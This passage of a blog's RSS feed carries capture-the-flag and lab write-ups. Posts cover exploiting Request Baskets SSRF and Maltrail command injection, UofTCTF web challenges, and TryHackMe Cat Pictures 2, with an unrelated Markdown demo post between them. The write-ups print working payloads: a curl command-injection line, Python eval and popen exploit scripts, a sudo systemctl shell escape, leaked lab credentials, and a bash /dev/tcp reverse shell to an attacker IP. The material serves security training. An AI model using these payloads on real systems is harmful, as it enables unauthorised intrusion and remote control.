SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(TLSSessionReq,67,&quot;H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(Ke
SF:rberos,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  9 21:06:41 2023 -- 1 IP address (1 host up) scanned in 584.89 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/darklynx/request-baskets&quot;&gt;! POC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;During my reconnaissance phase, I discovered a website that utilizes the Request Baskets service.&lt;/p&gt;
&lt;p&gt;This web service provides me with the flexibility to collect and examine HTTP requests through either a RESTful API or a user-friendly web interface&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/560e444d-8bd9-4daa-82ee-7dd6e301d54f&quot; alt=&quot;image e&quot; /&gt;&lt;/p&gt;
&lt;p&gt;An intriguing detail we observed is that the service we stumbled upon is running an outdated version, whereas the most recent version available is 1.2.3.
This divergence raises the possibility of potential vulnerabilities that we can exploit during our exploitation process.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/77afb146-755e-423f-a258-df1685262d36&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;While conducting the vulnerability assessment for this particular system version, I discovered an SSRF (Server-Side Request Forgery) vulnerability.
This vulnerability exposes a significant risk as it allows for the unauthorized disclosure of confidential information, including port enumeration.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/test&quot;,
  &quot;proxy_response&quot;: false,
  &quot;insecure_tls&quot;: false,
  &quot;expand_path&quot;: true,
  &quot;capacity&quot;: 250
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Following the outlined steps in the documentation, I proceeded to create a new basket.
However, I deviated from the default GET request method and modified it to a POST request, making the following adjustments.&lt;/p&gt;
&lt;p&gt;By leveraging the SSRF vulnerability, I successfully created a targeted route that allowed me access.
Within this route, I proceeded to exploit the SSRF vulnerability further, capitalizing on its weaknesses.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/206e245e-494a-4b22-be1b-e8c6a94c4074&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.11.224:55555/web/achux21
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/0f5c895b-8629-4e65-aaab-5758f0eb10b7&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/f00be81b-f91e-4cda-9769-bcab86f16cb8&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;While accessing the route generated by exploiting the SSRF vulnerability, we came across the Maltrail application.
Maltrail serves as a robust system for detecting and analyzing malicious network traffic.
It relies on public lists containing suspicious and malicious traces, as well as static traces obtained from reports by various antivirus providers
However, it is essential to highlight that the version of Maltrail we encountered is outdated, potentially implying the presence of unaddressed vulnerabilities.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/stamparm/maltrail&quot;&gt;Matrail V0.53&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;During the analysis, I discovered an unauthenticated command execution vulnerability within the Maltrail application.
This vulnerability resides in the subprocess.check_output function, specifically in the file mailtrail/core/httpd.py.
The root cause of this vulnerability is a command injection flaw present in the params.get(&quot;username&quot;) parameter.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87&quot;&gt;https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/3bde8930-a81e-4cd6-9122-698c80fcd9fc&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;By exploiting this vuln we could have a remote code execution.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl &apos;http://hostname:8338/login&apos; --data &apos;username=;$(id &amp;amp;gt; /tmp/bbq)&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/465aa762-6566-4472-bb11-f89508166417&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;it&apos;s time to focus on privilege escalation.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
sudo  /usr/bin/systemctl status trail.service
!sh
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
sudo  /usr/bin/systemctl status trail.service
!sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/9a551f35-dead-4e8e-9715-9c248c2d006a&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo -l
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/28b72b20-2633-492a-b25c-ab9a253db14a&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;BYE&lt;/p&gt;
</content:encoded></item><item><title>U of T CTF</title><link>https://iloveweb.online/posts/u-of-t-ctf/</link><guid isPermaLink="true">https://iloveweb.online/posts/u-of-t-ctf/</guid><pubDate>Sun, 14 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Description : he University of Toronto is hosting its second inaugural Capture the Flag competition. It will be jeopardy-style, held online with categories such as Web, Pwn, Rev, Crypto, Misc, and more! There will be plenty of challenges for both beginner and experienced players. The team size is limited to 4 players per team. This competition is organized by UofTCTF, GDSC (UTM), and MCSS (UTM) and sponsored by AON, UofT Department of Computer Science, UofT Information Security and Enterprise Architecture, LetsDefend.io
:::&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;uoftctf&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;URL&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://play.uoftctf.org/&quot;&gt;UofTCTF&lt;/a&gt;, &lt;a href=&quot;https://ctftime.org/event/2219&quot;&gt;Ctf-Time&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Category&lt;/td&gt;
&lt;td&gt;Web&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;1. Voice Changer - OS Injection&lt;/h2&gt;
&lt;p&gt;This website uses FFmpeg to generate an OGG file. In this challenge, an OS injection vulnerability exists in the FFmpeg command.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/322e6697-62b4-4cd8-98a5-86d031085db1&quot; alt=&quot;OS Injection Image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Let&apos;s attempt to induce a delay in the command using &lt;code&gt;$(sleep 10)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/f7cdcc2c-f1d7-4bb5-aa2c-2ccb9d20d107&quot; alt=&quot;Sleep Command Image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The image reveals a 10-second delay resulting from the execution of the sleep command.&lt;/p&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;To exploit this vulnerability, our approach involves redirecting the flag to our webhook site:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/cb206e1e-dde5-4c64-8164-0c299ddf5788&quot; alt=&quot;Webhook Image 1&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ echo &apos;dW9mdGN0ZntZMFVSIFBpdGNoIElTIDcwTyBIITlIfQ==&apos; |base64 -d
uoftctf{Y0UR Pitch IS 70O H!9H}%  
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;2. The Varsity&lt;/h2&gt;
&lt;h3&gt;Solution:&lt;/h3&gt;
&lt;p&gt;To address the issue, generate a valid (JWT) and proceed by sending a POST request to article number 9 with this json {&quot;issue&quot;:&quot;9&apos;&quot;}&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &quot;https://uoftctf-the-varsity.chals.io:443/register&quot;
json={&quot;username&quot;: &quot;achuxer&quot;}
reg = requests.post(url, json=json)

valid_jwt = reg.headers[&quot;Set-Cookie&quot;].split(&quot;=&quot;)[1].split(&quot;;&quot;)[0]

session = requests.session()

_url = &quot;https://uoftctf-the-varsity.chals.io:443/article&quot;
_cookies = {&quot;token&quot;: valid_jwt}
_json={&quot;issue&quot;: &quot;9&apos;&quot;}
flag = session.post(_url, cookies=_cookies, json=_json)

print(flag.json()[&quot;content&quot;])
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;3. No Code - Eval&lt;/h2&gt;
&lt;h3&gt;Source&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route(&apos;/execute&apos;, methods=[&apos;POST&apos;])
def execute_code():
    code = request.form.get(&apos;code&apos;, &apos;&apos;)
    if re.match(&quot;.*[\x20-\x7E]+.*&quot;, code):
        return jsonify({&quot;output&quot;: &quot;jk lmao no code&quot;}), 403
    result = &quot;&quot;
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({&quot;output&quot;: result}), 200

if __name__ == &quot;__main__&quot;:
    app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;Sending \n in the start of your payload cz re.match() will only match at the beginning of the string and not at the beginning of each line.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests
import string,sys
url = &apos;https://uoftctf-no-code.chals.io/execute&apos;

payload = &quot;\n__import__(&apos;os&apos;).popen(&apos;cat flag.txt&apos;).read()&quot;

data = {
    &apos;code&apos;: payload
}
response = requests.post(url, data=data)
print(response.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;4. Guestbook - Hidden Flag&lt;/h2&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;By reading the html source you can see POST action directed towards a Google Spreadsheet with the parameter &quot;sheetID&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/e5c48610-12d1-4f6f-9dbc-66d4a693d78a&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After googling around,with this id you can obtain spreadsheet docs.&lt;/p&gt;
&lt;p&gt;https://docs.google.com/spreadsheets/d/1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ/edit&lt;/p&gt;
&lt;p&gt;Following this step, you can notice two hidden rows. Once I copied the doc, I had access to the flag&lt;/p&gt;
&lt;h2&gt;5.  My First App - JWT / SSTI&lt;/h2&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;Initially, you must crack a JWT to reveal the jwt_key. Furthermore, there&apos;s an SSTI in the username field from the JWT-cookie, but with certain blacklisted characters/words.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/ebca8511-d882-427b-aba0-65607fcbb5cd&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;PY:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/0fe38719-200d-42f3-9ea6-93ac24841d1e&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;For The Code :
&lt;a href=&quot;https://github.com/ACHUX21/Writeups/blob/main/2024/UofTCTF/solve.py&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</content:encoded></item><item><title>Markdown Extended Features</title><link>https://iloveweb.online/posts/banners/markdown/</link><guid isPermaLink="true">https://iloveweb.online/posts/banners/markdown/</guid><description>Read more about Markdown features in Fuwari</description><pubDate>Wed, 01 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;GitHub repository cards&lt;/h2&gt;
&lt;p&gt;You can add dynamic cards that link to GitHub repositories, on page load, the repository information is pulled from the GitHub API.&lt;/p&gt;
&lt;p&gt;::github{repo=&quot;Fabrizz/MMM-OnSpotify&quot;}&lt;/p&gt;
&lt;p&gt;Create a GitHub repository card with the code &lt;code&gt;::github{repo=&quot;&amp;lt;owner&amp;gt;/&amp;lt;repo&amp;gt;&quot;}&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;::github{repo=&quot;saicaca/fuwari&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Admonitions&lt;/h2&gt;
&lt;p&gt;Following types of admonitions are supported: &lt;code&gt;note&lt;/code&gt; &lt;code&gt;tip&lt;/code&gt; &lt;code&gt;important&lt;/code&gt; &lt;code&gt;warning&lt;/code&gt; &lt;code&gt;caution&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;:::note
Highlights information that users should take into account, even when skimming.
:::&lt;/p&gt;
&lt;p&gt;:::tip
Optional information to help a user be more successful.
:::&lt;/p&gt;
&lt;p&gt;:::important
Crucial information necessary for users to succeed.
:::&lt;/p&gt;
&lt;p&gt;:::warning
Critical content demanding immediate user attention due to potential risks.
:::&lt;/p&gt;
&lt;p&gt;:::caution
Negative potential consequences of an action.
:::&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:::note
Highlights information that users should take into account, even when skimming.
:::

:::tip
Optional information to help a user be more successful.
:::
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The title of the admonition can be customized.&lt;/p&gt;
&lt;p&gt;:::note[MY CUSTOM TITLE]
This is a note with a custom title.
:::&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:::note[MY CUSTOM TITLE]
This is a note with a custom title.
:::
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h2&gt;title: Include Video in the Posts
published: 2023-08-01
description: This post demonstrates how to include embedded video in a blog post.
tags: [Example, Video]
category: Examples
draft: true&lt;/h2&gt;
&lt;p&gt;Just copy the embed code from YouTube or other platforms, and paste it in the markdown file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
title: Include Video in the Post
published: 2023-10-19
// ...
---

&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;YouTube&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;Bilibili&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;//player.bilibili.com/player.html?bvid=BV1fK4y1s7Qf&amp;amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;title: Markdown Example
published: 2023-10-01
description: A simple example of a Markdown blog post.
tags: [Markdown, Blogging, Demo]
category: Examples
draft: true&lt;/h2&gt;
&lt;h1&gt;An h1 header&lt;/h1&gt;
&lt;p&gt;Paragraphs are separated by a blank line.&lt;/p&gt;
&lt;p&gt;2nd paragraph. &lt;em&gt;Italic&lt;/em&gt;, &lt;strong&gt;bold&lt;/strong&gt;, and &lt;code&gt;monospace&lt;/code&gt;. Itemized lists
look like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;this one&lt;/li&gt;
&lt;li&gt;that one&lt;/li&gt;
&lt;li&gt;the other one&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note that --- not considering the asterisk --- the actual text
content starts at 4-columns in.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Block quotes are
written like so.&lt;/p&gt;
&lt;p&gt;They can span multiple paragraphs,
if you like.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Use 3 dashes for an em-dash. Use 2 dashes for ranges (ex., &quot;it&apos;s all
in chapters 12--14&quot;). Three dots ... will be converted to an ellipsis.
Unicode is supported. ☺&lt;/p&gt;
&lt;h2&gt;An h2 header&lt;/h2&gt;
&lt;p&gt;Here&apos;s a numbered list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;first item&lt;/li&gt;
&lt;li&gt;second item&lt;/li&gt;
&lt;li&gt;third item&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Note again how the actual text starts at 4 columns in (4 characters
from the left side). Here&apos;s a code sample:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Let me re-iterate ...
for i in 1 .. 10 { do-something(i) }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you probably guessed, indented 4 spaces. By the way, instead of
indenting the block, you can use delimited blocks, if you like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;define foobar() {
    print &quot;Welcome to flavor country!&quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(which makes copying &amp;amp; pasting easier). You can optionally mark the
delimited block for Pandoc to syntax highlight it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
# Quick, count to ten!
for i in range(10):
    # (but not *too* quick)
    time.sleep(0.5)
    print i
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;An h3 header&lt;/h3&gt;
&lt;p&gt;Now a nested list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;First, get these ingredients:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;carrots&lt;/li&gt;
&lt;li&gt;celery&lt;/li&gt;
&lt;li&gt;lentils&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Boil some water.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Dump everything in the pot and follow
this algorithm:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; find wooden spoon
 uncover pot
 stir
 cover pot
 balance wooden spoon precariously on pot handle
 wait 10 minutes
 goto first step (or shut off burner when done)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Do not bump wooden spoon or it will fall.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Notice again how text always lines up on 4-space indents (including
that last line which continues item 3 above).&lt;/p&gt;
&lt;p&gt;Here&apos;s a link to &lt;a href=&quot;http://foo.bar&quot;&gt;a website&lt;/a&gt;, to a &lt;a href=&quot;local-doc.html&quot;&gt;local
doc&lt;/a&gt;, and to a &lt;a href=&quot;#an-h2-header&quot;&gt;section heading in the current
doc&lt;/a&gt;. Here&apos;s a footnote [^1].&lt;/p&gt;
&lt;p&gt;[^1]: Footnote text goes here.&lt;/p&gt;
&lt;p&gt;Tables can look like this:&lt;/p&gt;
&lt;p&gt;size material color&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;9 leather brown
10 hemp canvas natural
11 glass transparent&lt;/p&gt;
&lt;p&gt;Table: Shoes, their sizes, and what they&apos;re made of&lt;/p&gt;
&lt;p&gt;(The above is the caption for the table.) Pandoc also supports
multi-line tables:&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;keyword text&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;red Sunsets, apples, and
other red or reddish
things.&lt;/p&gt;
&lt;p&gt;green Leaves, grass, frogs
and other things it&apos;s
not easy being.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;A horizontal rule follows.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Here&apos;s a definition list:&lt;/p&gt;
&lt;p&gt;apples
: Good for making applesauce.
oranges
: Citrus!
tomatoes
: There&apos;s no &quot;e&quot; in tomatoe.&lt;/p&gt;
&lt;p&gt;Again, text is indented 4 spaces. (Put a blank line between each
term/definition pair to spread things out more.)&lt;/p&gt;
&lt;p&gt;Here&apos;s a &quot;line block&quot;:&lt;/p&gt;
&lt;p&gt;| Line one
| Line too
| Line tree&lt;/p&gt;
&lt;p&gt;and images can be specified like so:&lt;/p&gt;
&lt;p&gt;Inline math equations go in like so: $\omega = d\phi / dt$. Display
math should get its own line and be put in in double-dollarsigns:&lt;/p&gt;
&lt;p&gt;$$I = \int \rho R^{2} dV$$&lt;/p&gt;
&lt;p&gt;And note that you can backslash-escape any punctuation characters
which you wish to be displayed literally, ex.: `foo`, *bar*, etc.&lt;/p&gt;
</content:encoded></item><item><title>Cat Pictures 2</title><link>https://iloveweb.online/posts/catpictures2/</link><guid isPermaLink="true">https://iloveweb.online/posts/catpictures2/</guid><description>Now with more Cat Pictures!</description><pubDate>Fri, 07 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
Now with more Cat Pictures!
:::&lt;/p&gt;
&lt;h1&gt;Enumeration&lt;/h1&gt;
&lt;h3&gt;Let&apos;s begin with a rapid Nmap scan.&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../CTFs/catpictures2# nmap -sCV -oN nmap 10.10.44.70
# Nmap 7.80 scan initiated Mon Jul  3 19:58:08 2023 as: nmap -sCV -oN nmap 10.10.44.70
Nmap scan report for 10.10.44.70
Host is up (0.079s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  3 19:58:29 2023 -- 1 IP address (1 host up) scanned in 21.17 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;*80 — lychee*
*8080 — python http server*
*22,222 — ssh*
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Performing a scan using Dirsearch&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.187.79/-_23-07-06_21-12-01.txt

Error Log: /root/.dirsearch/logs/errors-23-07-06_21-12-01.log

Target: http://10.10.187.79/

[21:12:01] Starting: 
[21:12:03] 301 -  193B  - /robots.txt 
[21:12:04] 403 -  579B  - /.git/
[21:12:04] 403 -  579B  - /.github/
[21:12:04] 403 -  579B  - /.git/refs/
[21:12:04] 403 -  579B  - /.git/objects/
[21:12:04] 200 -  154B  - /.github/ISSUE_TEMPLATE.md
[21:12:04] 200 -  274B  - /.gitignore
[21:12:04] 200 -  630B  - /.htaccess
[21:12:07] 200 -  387B  - /.user.ini
[21:12:09] 200 -    1KB - /LICENSE
[21:12:10] 200 -    5KB - /README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I attempted to gather information by exploring the .git repository and robots.txt file, but unfortunately, I didn&apos;t find anything of interest.&lt;/p&gt;
&lt;p&gt;After some time, I managed to discover interesting information from the EXIF data extracted from an image.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../CTFs/catpictures2# exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
ExifTool Version Number         : 12.40
File Name                       : f5054e97620f168c7b5088c85ab1d6e4.jpg
Directory                       : .
File Size                       : 71 KiB
File Modification Date/Time     : 2022:11:07 19:44:37+01:00
File Access Date/Time           : 2023:07:06 21:20:55+01:00
File Inode Change Date/Time     : 2023:07:06 21:19:41+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;this part
&lt;code&gt;Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It appears that the system is utilizing The other web server to retrieve Info.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;note to self:

I setup an internal gitea instance to start using IaC for this server. It&apos;s at a quite basic state, but I&apos;m putting the password here because I will definitely forget.
This file isn&apos;t easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;samarium:TUmhyZ37CLZrhP&lt;/p&gt;
&lt;h3&gt;Upon obtaining this information, we realized that there is a Gitea server running on port 3000, and we have obtained valid credentials for it.&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/d5da60f1-a1cd-4731-af5d-89b6eccc7f87&quot; alt=&quot;Screenshot from 2023-07-06 21-31-32&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Gaining access&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/23cfac7c-5b54-494f-a91b-be69ffc138f1&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Given our knowledge of Ansible Runner (Olivetin) on port 1337, which enables the execution of Ansible playbooks, I intend to replace the existing &quot;echo&quot; command with a reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.18.81.1/14632 0&amp;gt;&amp;amp;1&quot;
&lt;/code&gt;&lt;/pre&gt;
